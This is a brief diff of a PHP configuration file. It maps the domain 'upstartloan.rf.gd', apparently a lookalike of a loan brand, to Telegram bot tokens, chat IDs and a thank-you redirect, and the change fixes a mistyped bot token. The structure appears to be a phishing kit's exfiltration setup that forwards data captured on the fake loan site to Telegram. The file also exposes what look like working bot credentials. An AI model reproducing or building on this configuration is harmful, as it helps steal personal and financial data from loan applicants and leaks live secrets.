@@ -10,7 +10,7 @@ $site_map = [
     "upstartloan.rf.gd" => [
         "bots" => [
             ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
-            ["token" => "7683707216:AAFKB6Izdj c-M2mIaR_vRf-9Ha7CkEh7rA", "chat_id" => "6108491247"],
+            ["token" => "7683707216:AAFxKB6Izdjc-M2mIaR_vRf-9Ha7CkEh7rA", "chat_id" => "6108491247"],
         ],
         "redirect" => "https://upstartloan.rf.gd/cache_site/thankyou.html"
     ],
